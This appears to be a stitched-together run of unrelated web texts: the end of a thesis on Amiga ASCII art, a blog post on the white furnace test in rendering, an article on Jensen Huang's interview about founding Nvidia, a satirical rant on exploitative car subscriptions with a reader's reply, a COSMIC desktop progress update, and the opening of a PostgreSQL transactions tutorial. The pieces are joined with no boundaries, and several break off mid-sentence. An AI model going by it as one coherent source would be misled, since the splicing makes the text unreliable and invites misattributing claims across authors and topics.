computer. This allowed me to start creating Amiga ASCII images and delve deeper into the method of making ASCII images. I set my text editor's user settings to use the Amiga Topaz font, reduced the line height, and changed the colors to black and white. This allowed me to achieve the desired results.</p><figure><img alt="Logo in black and white filled ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/xFJQZQunWZ-822.png" width="822" height="406"><figcaption>(Figure 18.) My first ASCII attempt. When looked at closely, the above appears as a heap of random letters and symbols. However, by squinting, one can discern that it reads GRMMXI. Each character has its texture, contrast, and shape, which, when placed side by side, are reduced to a larger cohesive form or surface. I later learned that this is called filled ASCII, which was a common method of creating ASCII on PC computers.</figcaption></figure><h2 id="32-production-process">3.2. PRODUCTION PROCESS</h2><h3 id="321-description-of-creating-amiga-ascii-images">3.2.1. DESCRIPTION OF CREATING AMIGA ASCII IMAGES</h3><p>Typing each character by hand required absolute focus. However, using the cut-paste technique, experimenting with new shapes and ideas was easy and smooth. This process enabled constant evaluation of the work. From the same logo, several different variations could be made.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/fb6TwRtWHq-640.png" width="640" height="578"><figcaption>(Figure 19.) Logo variations. My early logo exercises, experimenting with different variations of an easily readable logo.</figcaption></figure><p>However, creating logos began to feel challenging and rigid. Comparing my logos to those made by others, I felt that I was not succeeding in creating an original yet stylish logo type. I tried sketching ASCII logos in a drawing book, but that also felt frustrating since, for instance, curved shapes are tricky, if not impossible, to make with Amiga ASCII. It was better to draft directly in the text editor and let the restrictions set by the characters influence the formation of the shapes.</p><p>For this reason, I wanted to break free and create images and logos that deviated from Amiga ASCII conventions. I also realized that I didn't need to follow the footsteps of previous ASCII artists and therefore didn't set clear content guidelines. I only decided in advance that I would try different methods and see what felt right and most inspiring. Hence, the image themes don't follow a clear unified line; the result consists of different experiments.</p><p>I tried a more expressive form language by creating logos that consisted of sharp angles and straight lines combined with wiggly shapes using parenthesis. Using parentheses seemed promising since I hadn't seen many using them in their logos. I challenged myself and created a "slimy" logo that dripped downward using parentheses, which I found successful.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/68pGs-fmYD-432.png" width="432" height="369"><figcaption>(Figure 21.) Baltic Circle. Slime logo.</figcaption></figure><p>In one logo experiment, I added eyes and a mouth, making the letters look like fun characters. This inspired me to try creating human figures. With the special characters of the Amiga ASCII character set, I was able to create faces in different perspectives. The easiest facial features were the eyes, which I made using "hatted" variatons of a-, o-, and u-letters. However, making the mouth was challenging since very few Amiga ASCII characters are diagonally inclined. Drawing hands and feet also proved extremely difficult because of their round shapes.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/oHBF8UmsLN-640.png" width="640" height="754"><figcaption>(Figure 20.) Character sketches.</figcaption></figure><p>However, this image theme felt funniest and most inspiring to me. I felt most creative when making characters. According to Michael Hischer, whom I interviewed, representational images weren't highly valued in the past, but they are now viewed positively<sup><a href="#fn59" id="fnref59">[59]</a></sup>, which motivated me to continue drawing characters.</p><p>My enthusiasm for creating images experienced highs and lows. My initial goal was to draw at least one ASCII image per day, which I did in the early stages of the project. However, making logos felt challenging, and I became frustrated with my drawing. Satisfaction was hard to come by. Additionally, immersing myself in the topic and writing about it took a significant amount of energy. Writing the thesis was challenging from start to finish, as I realized early on that I had chosen a nearly unexplored topic. However, Amiga ASCII as a subject is extremely interesting, which helped me persevere in creating the thesis.</p><h3 id="322-making-the-colly">3.2.2. MAKING THE COLLY</h3><p>In the end, I created over 50 different logo and character experiments. I thought the number was too small to produce a decent final product, but when making the colly, I realized it was still sufficient.</p><p>I refined the ASCII images I had made and constructed the colly using the PabloDraw program. PabloDraw<sup><a href="#fn60" id="fnref60">[60]</a></sup> is an ASCII/ANSI editor for modern operating systems. It is specifically designed for ASCII art creation and includes Amiga's original Topaz font and column settings. For the colly, I had no clear idea; instead, I brought my separate image experiments into the program and started building suitable combinations from them.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Nowdays I would recommend using <a href="https://blocktronics.github.io/moebius/">Moebius</a> instead of PabloDraw.</p></div><p>The pieces fell into place on their own. At the beginning of the colly, I created a dreamscape that continues in a comic-like manner with a person pondering the creation of a thesis, adding a meta-level to the colly. From within the dreamlike landscape, the title of the colly, "innocence," is revealed, which I chose as a name to describe, firstly, the childishly innocent starting point of my authorship as a new ASCII artist, but also proclaiming my innocence in creating an unconventional colly stemming from my background.</p><p>After this, the colly continues with various styles and experiments that vaguely intertwine. My original ASCII images laid the foundation for the colly, but I still had to do a lot of work adding backgrounds, decorations, and details.</p><p>I find the final result interesting, and I am satisfied with it. The colly turned out to be significantly illustrative, which deviates from the traditions of Amiga ASCII collies. However, I believe this is a positive aspect since the colly as a whole remains cohesive and intriguing.</p><figure><img alt="Dot matrix printer printing the colly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/ML1Cbn8JO6-624.png" width="624" height="19026"><figcaption>(Figure 22.) The final colly!</figcaption></figure><h3 id="323-physical-final-product">3.2.3. PHYSICAL FINAL PRODUCT</h3><p>Collies are usually viewed on a computer screen, but I wanted to materialize my product into a physical form. This seemed like a challenging task, as collies are typically continuous, spanning several pages in length, making them difficult to sensibly present, for example, on the pages of a book.</p><p>I came up with the idea to print my Amiga ASCII images using a dot-matrix printer. It can print on continuous form paper, which modern printers cannot do. Continuous form paper is a continuous strip of paper perforated at regular intervals. Dot-matrix printers were common in the 80s and 90s before the advent of proper inkjet and laser printers. In a dot-matrix printer, graphics are printed as dots by striking pins against a black ribbon onto the paper. This was perfect for my purpose, as my images are black and white and would cover several vertical A4 pages in total. As the device was popular around the same time Amiga ASCII was most commonly produced, it also served as a fitting historical reference.</p><p>However, I don't own such a device, and according to a Facebook poll, none of my acquaintances did either. The device seemed to be outdated technology that no one had. But I didn't give up; I searched for "dot matrix printer" in the Fonecta search service. The search yielded only one result: the printer-manufacturing company, <em>OKI Finland</em>. I emailed them, asking if they knew where I could borrow a dot-matrix printer. Fortunately, and to my surprise, they had one to lend, which I borrowed for a month.</p><figure><img alt="Dot matrix printer printing the colly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/EwqKIXHCbw-1064.png" width="1064" height="802"><figcaption>(Figure 22.) Printing the colly with a matrix printer.</figcaption></figure><p>However, my luck changed when, upon testing the printer's features, I found out that it was not possible to print a completely continuous image. The printout of my production turned out to be over 5 meters long, and the printer left a margin of about a centimeter every 30 centimeters or so. This is due to the printer's drivers, which were not designed for long print runs, even if it would be theoretically possible. Nevertheless, I didn't let this discourage me, as the idea of the production still comes through despite this.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>I did manage to print it as a "continuous" image by printing one section at a time and then carefully positioning the paper again.</p></div><hr><p>The aim of the project was to explore Amiga ASCII culture, learn to observe forms, typography, and textures in a new way, enhance my creative expression, and gather insights for graphic design.</p><p>Amiga ASCII significantly resembles graphic design. It is used to embellish user interfaces, create logos for clients, and typographic design lies at its core. However, I don't feel that I've gained any practical benefit as a graphic designer from this project. The method of Amiga ASCII is unique, and it has no practical link to today's world. It's hard to instrumentalize. It operates under its own rules, in the margin, outside the mainstream. It is anti-capitalist, even anarchistic, because it is difficult to commercialize or display in art galleries. It can be described as digital folk art or tradition. It pales in expressive power compared to many other art methods. Yet, it's alluring, charming, and delightful because of its peculiar nature.</p><p>I don’t see that I have developed as a designer, but I feel I have gained immensely from the project. I am pleased to have been introduced to such an interesting topic. In my view, I have provided a comprehensive description of the subject. I feel proud to have learned a skill that many people I know had never even heard of, and in that respect, my goal was met: I developed my creative expression. However, I only scratched the surface and see a lot of potential in the method. I definitely intend to continue creating Amiga ASCII art. It would also be great if my project helped me become part of the Amiga ASCII community.</p><p>As Matt “mattmatthew” Yee states in a <em>Blocktronics</em> interview:</p><blockquote><p>"The works done by new and old artists these days are probably the best the scene has ever seen, with a few exceptions. My peers have developed this method further than it has ever been developed before. This is an exciting time to draw." <sup><a href="#fn61" id="fnref61">[61]</a></sup></p></blockquote><p>I look forward to following the development of Amiga ASCII art.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>8 years later, I must say doing this thesis was a real turning point for me! It's difficult to put into words how and how much it benefitted me as a graphic designer or as a person, but as text art is still at the core of my practice, I would say <em>a lot</em>. The "practical" use of Amiga ASCII has mainly come from learning and understanding the <em>modular process</em> of image making, which has enabled me to develop various modular design tools that I've used in my profession as a graphic designer. Even so much that I rarely use any Adobe software anymore.</p><p>I did join the Amiga ASCII community shortly after releasing my thesis, by joining the "Impure!ASCII 1940" group. In 2021 I collaborated with them by making an <a href="https://www.youtube.com/watch?v=X9wodTL9XVA">8 minute long train ride animation</a> that even won the PC Demo compo at Flashparty 2021. I'm really happy how it turned out!</p><p>Even though it's been 8 years, I still feel like I've only scratched the surface of the potential in the method. I don't see myself stopping anytime soon.</p></div><hr><h2 id="sources">SOURCES</h2><h2 id="51-printed-sources">5.1. PRINTED SOURCES</h2><ul><li>Bann, Stephen (1967): <em>Concrete poetry.

<p>The white furnace test is one of my favourite rendering debug tools. But before it was so, it was rather mysterious and abstract to me. Why would a publication proudly show what seemed like empty renders? What does it mean, and why would they care?</p>



<figure><img decoding="async" src="http://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-500x281.jpg" alt="Slide from the presentation Revisiting Physically Based Shading at Imageworks, in which a white furnace test of the diffuse term is shown." width="500" height="281" srcset="https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-500x281.jpg 500w, https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-300x168.jpg 300w, https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test-768x431.jpg 768w, https://lousodrome.net/blog/light/files/2023/09/Conty_2017-diffuse-term-white-furnace-test.jpg 1514w" sizes="(max-width: 500px) 100vw, 500px"><figcaption>What’s up with the empty grey rectangle? The fact that looks empty <em>is</em> the point.<br><em>Revisiting Physically Based Shading at Imageworks</em>, presented at the <a href="https://blog.selfshadow.com/publications/s2017-shading-course/">SIGGRAPH 2017 course: Physically Based Shading in Theory and Practice</a>.</figcaption></figure>



<p>The idea is the following: if you have a 100% reflective object that is lit by a uniform environment, it becomes indistinguishable from the environment. It doesn’t matter if the object is matte or mirror like, or anything in between: it just “disappears”.</p>



<p>Accepting this idea took me a while, but there is a real-life situation in which you can experience this effect. Fresh snow can have an albedo as high as 90% to 98%, i.e. nearly perfect white. Associated with overcast weather or fog, it can sometimes appear featureless and become completely indistinguishable from the sky, to the point you’re left with skiing by feel because you can’t even tell the slope two steps in front of you. Everything is just a uniform white in all directions: the <a href="https://en.wikipedia.org/wiki/Whiteout_(weather)">whiteout</a>.</p>



<figure><img decoding="async" loading="lazy" width="500" height="243" src="http://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-500x243.jpg" alt="Photo taken on a ski track. The ground appears almost uniformly white." srcset="https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-500x243.jpg 500w, https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-300x146.jpg 300w, https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-768x373.jpg 768w, https://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test.jpg 1440w" sizes="(max-width: 500px) 100vw, 500px"><figcaption>Last time I visited a white furnace test. Note how the snow surface slope and details are almost invisible, and the sign in the background seems to be floating in the air.</figcaption></figure>



<p>With the knowledge that a 100% reflective object is supposed to look invisible when uniformly lit, verifying that it does is a good sanity test for a physically based renderer, and the reason why you sometimes see those curious illustrations in publications. It’s showing that the math checks out.</p>



<p>Those tests are usually intended to verify that a BRDF is energy preserving: making sure that it is not losing or adding energy. A typical topic for example is <a href="https://google.github.io/filament/Filament.md.html#materialsystem/improvingthebrdfs/energylossinspecularreflectance">making sure materials don’t look darker as roughness increases</a> and inter-reflections become too significant to be neglected. Missing energy is not the only concern though, and a grey environment (as opposed to a white one) is convenient as any excess of reflected energy will appear brighter than it.</p>


<figure>
<figcaption>Demonstration of the white furnace test on ShaderToy, or an expensive way to render an empty image. Press the play button to see the scene revealed.</figcaption></figure>


<p>But verifying the energy conservation of a BRDF is just one of the cases where the white furnace test is useful. Since a Lambertian BRDF with an albedo of 100% is perfectly energy preserving and completely trivial to implement, the white furnace test with such a white Lambert material can be used to reveal bugs in the renderer implementation itself.</p>



<div><p>There are so many aspects of the implementation that can go wrong: the sampling distribution, the proper weighting of the samples, a mistake in the PDF, a pi or a 2 factor forgotten somewhere… Those errors tend to be subtle and can result in a render that still looks reasonable. Nothing looks more like a correct shading than a slightly incorrect one.</p><p>So when I’m either writing a path tracer or one of its variants, or generating a pre-convolved environment map, or trying different sampling distributions, my first sanity check is to make sure it passes the white furnace test with a pure white Lambertian BRDF. Once that is done (and as writing the demonstration shader above showed me once again, that can take a few iterations), I can have confidence in my implementation and test the BRDF themselves.</p></div>



<p>Take away: the white furnace test is a very useful debugging tool to validate both the integration part and the BRDF part of your rendering.<br></p>

This is something of a surprise, coming from the founder of one of PC tech's biggest successes and now a <a href="https://www.tomshardware.com/news/nvidia-ceo-balances-10-plates-serves-crowded-after-work-dennys-event" data-before-rewrite-localise="https://www.tomshardware.com/news/nvidia-ceo-balances-10-plates-serves-crowded-after-work-dennys-event">trillion-dollar</a> firm.</p><p>The lengthy interview with AcquiredFM hosts Ben and David contains some fascinating insight, especially about pivotal times during the early days of Nvidia. The most curious thing to hear is that Jensen Huang wouldn't follow the same path if he could turn back the clock by 30 years.&nbsp;</p><p>Huang is very candid about his reasons for not wanting to follow the same path again. "Building Nvidia turned out to be a million times harder than I expected it to be," the Nvidia CEO told the interviewers. With a 20:20 vision of times gone by, many would change some aspects of their life, but Nvidia is such a resounding success it is hard to consider it a source of regret for a founder.</p><div data-nosnippet=""><p><iframe data-lazy-priority="high" data-lazy-src="https://www.youtube.com/embed/y6NfxiemvHg" allowfullscreen=""></iframe></p></div><h2 id="the-superpower-of-an-entrepreneur">The Superpower of an Entrepreneur</h2><p>Huang hints that there is something inside him (and other entrepreneurs), which means they push ahead with projects that others consider impossible. He told the interviewers that the "superpower of an entrepreneur" is facing enormous tasks and asking themselves, "How hard can it be?" Huang asked himself this question before founding Nvidia as a <a href="https://www.tomshardware.com/reviews/best-gpus,4380.html" data-before-rewrite-localise="https://www.tomshardware.com/reviews/best-gpus,4380.html">PC graphics</a> company and subsequently starting the other major ventures Nvidia has made breakthroughs in - like AI and automotive.</p><p>If the above sounds somewhat negative, Huang's tone in this part of the interview isn't really regretful but more like an impassive observer. He wouldn't willingly follow the whole journey again, saying, "I think it's too much. It is just too much." He references feelings like pain, suffering, shame, and embarrassment. Nevertheless, Huang lives positively and assures the interviewers, "I'm still enjoying myself immensely and I'm adding a little bit of value, but that's really the trick of an entrepreneur." Moreover, he says he is still fooling himself that things are easier than prior experience might indicate.</p><h2 id="riva-128-retrospective">Riva 128 Retrospective</h2><p>Older readers who have watched Nvidia's progress over the years may be interested in the major opening part of the AcquiredFM interview. In this section, Huang talks about the pivotal 'reset' to Nvidia, which precipitated the <a href="https://www.tomshardware.com/reviews/review-agp-graphic-cards,38-7.html" data-before-rewrite-localise="https://www.tomshardware.com/reviews/review-agp-graphic-cards,38-7.html">Riva 128 graphics card</a> in 1997.</p><p>The Nvidia CEO says the company had its back against a wall, and decided to go all-in with <a href="https://www.tomshardware.com/news/microsoft-directx-12-ultimate" data-before-rewrite-localise="https://www.tomshardware.com/news/microsoft-directx-12-ultimate">Microsoft DirectX</a> acceleration. It wanted to make the biggest chip, with the largest quantity of the fastest memory available at the time - and at a cost point substantially higher than rivals dared.</p><p>However, with just six months of cash left and no spare funds, Nvidia didn't do physical chip testing, only testing the Riva 128 using simulation before the production run. It turned out that only eight out of 32 DirectX blend modes were supported by shipping silicon. Nevertheless, the Riva 128 succeeded for several reasons, including its delivery of the "world's first fully accelerated hardware-accelerated pipeline for rendering 3D."</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" alt="Min-Liang Tan on LinkedIn" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1200-80.jpg.webp 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ.jpg"><source type="image/jpeg" alt="Min-Liang Tan on LinkedIn" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1200-80.jpg 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ.jpg"><img src="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ.jpg" alt="Min-Liang Tan on LinkedIn" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1200-80.jpg 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ.jpg" srcset="https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/27XaL4szCQrMHziUBnGDMZ-1200-80.jpg 1200w"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Future)</span></figcaption></figure><h2 id="razer-boss-me-too">Razer Boss: Me Too</h2><p>Razer CEO Min-Liang Tan <a href="https://www.linkedin.com/posts/mltan_the-most-shocking-thing-from-talking-with-activity-7121026223736029185--QUN/?utm_source=share&amp;utm_medium=member_desktop" data-url="https://www.linkedin.com/posts/mltan_the-most-shocking-thing-from-talking-with-activity-7121026223736029185--QUN/?utm_source=share&amp;utm_medium=member_desktop">commented</a> upon the AcquiredFM video a few hours ago.

What if the dashboard could show ads before the car starts? It’s just a second of your time. What if a gas station network like Circle K could sponsor your car so it tells you to get a specific type of gasoline? Why not subscription for “optional” safety features that were standard? Why not a way to remotely disable cars with a warning light on the dash “for your own safety” until they visit a certified dealer? Why not coded car parts so the customer gets a “genuine product” and doesn’t “accidentally” install a cheaper generic counterpart? Why not pay as you go features instead of paying upfront? Why not track places you drive to with your car, the conversations you have in it, the people you call, and whether you drive with your wife and/or kids for behavioural advertising elsewhere? What about an eco mode subscription that <i>saves</i> you money when compared to not buying it, despite that it is always free with cars today?</p><p>Maybe we could also disable some people’s cars to align with certain political demographics and identities, like we cancel, deplatform, and get people fired for slights online now? Could that paint us in a positive light in certain demographics? One client lost for a thousand gained!</p><p>Maybe an auto-911 crash detection subscription? You wouldn’t want to be the mother whose kid dies in a car crash so you’d save $19.99 a month, would you? Anything if it moves more cars or at a higher marginal revenue, right?</p><p>And let’s not forget marginal costs - what could be cheaper? Maybe some parts are too durable. A lot of things could be digital - break lines, steering, the accelerator, door locks, seat belt mechanisms, mirrors and so on. And we could save doubly by outsourcing all this work to the cheapest bidder, whether they specialize in automotive safety or web design.</p><p>Anything for the sake of growth. And it’s coming. Sooner or later, there won’t be a company in the auto industry providing appealing returns unless they charge their users more, exploit them more, or save up for a nicer dividend by cutting some corners. Not today, not this year, maybe not in the immediate future. But this is the natural conclusion of the flavor of capitalism we do.</p><p>I don’t blame capitalism for everything. It’s good for a lot of things. But it totally fails humanity when large corporations are involved. We should change it before a bunch of our industries collapse under their self-destructive behaviors driven by greed. Because right now, a good investment strategy is to constantly keep investing in companies who irreparably harm themselves and their customers long-term for a quick buck. You just need to build your portfolio of these and dump them once their sell-out is over. And this makes money. An investor would be unwise not to pick a money-making strategy.</p><p>It is in everyone’s best capitalistic interest to exploit others to the max. And when all that could be exploited is, well… no one managing companies thinks about this. The investors want returns now, all the time. The executives know how to sell-out for this and golden-parachute into the next company to do it all again. The employees are laid off and customers are mistreated, but hey - capitalism is to acquire capital. It’s not called moralism.

Why not coded car parts so the customer gets a “genuine product” and doesn’t “accidentally” install a cheaper generic counterpart? Why not pay as you go features instead of paying upfront? Why not track places you drive to with your car, the conversations you have in it, the people you call, and whether you drive with your wife and/or kids for behavioural advertising elsewhere? What about an eco mode subscription that saves you money when compared to not buying it, despite that it is always free with cars today?<p>&gt;Maybe we could also disable some people’s cars to align with certain political demographics and identities, like we cancel, deplatform, and get people fired for slights online now? Could that paint us in a positive light in certain demographics? One client lost for a thousand gained!</p><p>All them can be theoretically done today. If companies are really chasing after "infinite growth", why are they leaving money on the table by not implementing those things?</p><p>The answer is obvious. There's nothing stopping them from making things arbitrarily shitty, but they don't because consumers will hate it and switch to a competitor that doesn't have those things.</p><p>&gt;Maybe an auto-911 crash detection subscription? You wouldn’t want to be the mother whose kid dies in a car crash so you’d save $19.99 a month, would you? Anything if it moves more cars or at a higher marginal revenue, right?</p><p>Isn't this already a thing today? I think GM pioneered it with OnStar. I don't think there's even a car that does auto-911 today for free.

<div id="readability-page-1" class="page"><div data-v-7773bbb7=""><p>Halloween is fast approaching, so we’re handing out COSMIC treats to all who approach our digital door! These delectable sweets take the form of new features for COSMIC DE, a new desktop environment we’re building for Pop!_OS and other distros. Now take a peek under the mask at the latest progress for COSMIC!</p><h2>Lock and Login Screens</h2><p>Designs and most engineering for COSMIC lock and login screens are now complete!</p></div><div data-v-7773bbb7=""><p>Here, you can check date and time, wifi and battery statuses, keyboard input language, and switch users. From the login screen you can also restart or power off the computer. Meanwhile, using the gear icon will switch your software session (from Pop!_OS with COSMIC DE to Pop!_OS with KDE, for example).</p><p>The login screen defaults to the user that was last logged in. Check it out in this login screen <a target="_blank" rel="noopener" href="https://www.figma.com/proto/VvuorfxkbrKqIl365tLNev/Lock-screen?type=design&amp;node-id=160-10174&amp;t=UmiXVB8KlCoaBTJF-1&amp;scaling=min-zoom&amp;page-id=0%3A1&amp;starting-point-node-id=166%3A23629">prototype</a>! Jane’s super secure password is: “test”.</p><p>The wallpaper in this mockup is an image from Greg Rakozy on <a target="_blank" rel="noopener" href="https://unsplash.com/photos/oMpAz-DN-9I">Unsplash</a>.</p><h2>Implementing Appearance Settings</h2><p>An early design of COSMIC Appearance Settings are in the process of being implemented. In this Settings panel, you can choose between default Light and Dark modes, and customize the colors used in each. The team’s been experimenting with theming and the results have ranged from a bright cherry blossom, to a sophisticated red wine, to something one may call…hellish.</p>
    
  <p>Additionally, theming support is being added to cosmic-comp so that any theme changes you make are immediately visible.</p><p><strong>Early design for per-workspace tiling</strong></p><p>Tile windows in one workspace and float windows in another. Initial designs have undergone usability testing, and adjustments are being made to this exciting new feature! We’ll provide more info in a future blog post once it’s closer to being completed.</p><p><strong>Community Contribution: COSMIC Tiling applet</strong></p><p>Eduardo (@edfloreshz <a target="_blank" rel="noopener" href="https://github.com/edfloreshz">on GitHub</a>) has completed an early version of the <a target="_blank" rel="noopener" href="https://github.com/pop-os/cosmic-applets/pull/117">Tiling applet</a> for COSMIC DE. This applet is where you can toggle window tiling, show or hide hints, and view important tiling shortcuts. Great work!</p>

    </p>
  <p><strong>Support for modifier-only key bindings</strong></p><p>Modifier keys such as Ctrl, Shift, and Alt affect the actions taking place on a key press. Sometimes, though, pressing solely a modifier key can have the same effect; for example, the Super key activating the Launcher or the Alt key showing top bar buttons in Firefox. Support has been added for this, and at least one COSMIC team member is very happy to have their Launcher shortcut back!</p><p><strong>Pointer constraints protocol</strong></p><p>Support for <a target="_blank" rel="noopener" href="https://wayland.app/protocols/pointer-constraints-unstable-v1">pointer constraints</a>, such as confining it to a certain region or locking it in place, has been added. This is used alongside the <a target="_blank" rel="noopener" href="https://wayland.app/protocols/relative-pointer-unstable-v1">relative pointer</a> protocol in specialized cases, such as in gaming. Opening or navigating to a full-screen game hides the pointer from view and locks it in place, while mouse motions are tracked and translated to in-game actions.</p><p><strong>DMA-BUF screen capture support</strong></p><p>This buffer-sharing <a target="_blank" rel="noopener" href="https://docs.kernel.org/driver-api/dma-buf.html">tool</a> improves performance with tools like OBS. It enables devices in your system like the GPU to synchronize and share buffers with one another across multiple drivers.</p><p><strong>DRM leasing for VR device support</strong></p><p>Wayland relies on a subsystem (Direct Rendering Manager or DRM) to render games onto a display. But VR headsets, being a specialized, immersive display, perform the same functions themselves to provide a better experience. <a target="_blank" rel="noopener" href="https://github.com/pop-os/cosmic-comp/pull/191">DRM leasing</a>, now in cosmic-comp the COSMIC Wayland compositor, enables this by lending the system resources your headset requires to render and display the game image.</p><p><strong>UI development</strong></p><p>We’ve expanded our UI capabilities by adding a couple software pieces to further implement UX designs:</p>

    </p>
  <p>Using a layout library tool called <a target="_blank" rel="noopener" href="https://github.com/DioxusLabs/taffy">Taffy</a>, we were able to implement a new grid layout widget. “This was one of the most important widgets to implement,” says COSMIC engineer Michael, “ because it will enable the creation of complex layouts with proper alignments using minimal code.”</p>

  <p>
    Posted on <time datetime="2022-03-29">Tuesday March 29, 2022</time>
    
  </p>

  <p>One thing I wish I had understood better earlier on in my experience with
PostgreSQL is how transactions and locks can be used together to provide
serializable logic.</p>
<p>An easy way to illustrate this is with a simple bank account system. Suppose we
create an <code>accounts</code> table and populate it like this:</p>
<div><pre><code data-lang="sql"><span>create</span><span> </span><span>table</span><span> </span><span>accounts</span><span> </span><span>(</span><span>
</span><span>  </span><span>name</span><span> </span><span>text</span><span> </span><span>primary</span><span> </span><span>key</span><span>,</span><span>
</span><span>  </span><span>balance</span><span> </span><span>int</span><span> </span><span>not</span><span> </span><span>null</span><span>
</span><span></span><span>);</span><span>
</span><span></span><span>insert</span><span> </span><span>into</span><span> </span><span>accounts</span><span> </span><span>(</span><span>name</span><span>,</span><span> </span><span>balance</span><span>)</span><span> </span><span>values</span><span> </span><span>(</span><span>'A'</span><span>,</span><span> </span><span>10</span><span>),</span><span> </span><span>(</span><span>'B'</span><span>,</span><span> </span><span>0</span><span>);</span><span>
</span></code></pre></div><p>Now we have two bank accounts, <code>A</code> with a balance of $10, and <code>B</code> with a balance
of $0.</p>
<p>In order to be a <em>useful</em> bank, we want to be able to move money from one
account to another. In pseudocode, the way to move money from one account to
another might look something like:</p>
<pre><code>function moveMoney(from, to, amount):
  # Start a transaction.
  txn = db.begin()
  # Update the balances.
  txn.execute('update accounts set balance = balance - $amount where name = $from')
  txn.execute('update accounts set balance = balance + $amount where name = $to')
  # Commit the transaction.
  txn.commit()
</code></pre><p>We use a transaction here to make sure that either both updates succeed, or both
updates fail. In other words, we want to avoid the situation where money is
deducted from <code>A</code> but never deposited to <code>B</code>.</p>
<p>There’s another situation that we might want to avoid in our bank too: we might
want a rule that account balances can never be negative. To enforce this rule,
we can update our <code>moveMoney</code> function:</p>
<pre><code>function moveMoney(from, to, amount):
  # Moving a negative amount of money from A to B is equivalent to moving the
